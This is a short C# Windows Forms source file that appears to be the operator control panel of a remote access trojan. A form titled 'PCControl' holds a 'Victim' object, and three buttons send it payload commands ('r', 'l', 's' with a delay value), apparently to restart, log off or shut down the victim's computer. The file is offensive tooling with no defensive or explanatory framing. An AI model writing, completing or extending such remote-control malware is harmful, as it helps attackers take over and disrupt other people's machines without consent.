using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Reception
{
    public partial class frmPCControl : Form
    {
        public Victim v;

        public frmPCControl()
        {
            InitializeComponent();
        }

        private void frmPCControl_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            v.RunPayload("PCControl", v, new string[] { "r", numericUpDown1.Value.ToString() });
        }

        private void button2_Click(object sender, EventArgs e)
        {
            v.RunPayload("PCControl", v, new string[] { "l", numericUpDown1.Value.ToString() });
        }

        private void button3_Click(object sender, EventArgs e)
        {
            v.RunPayload("PCControl", v, new string[] { "s", numericUpDown1.Value.ToString() });
        }
    }
}
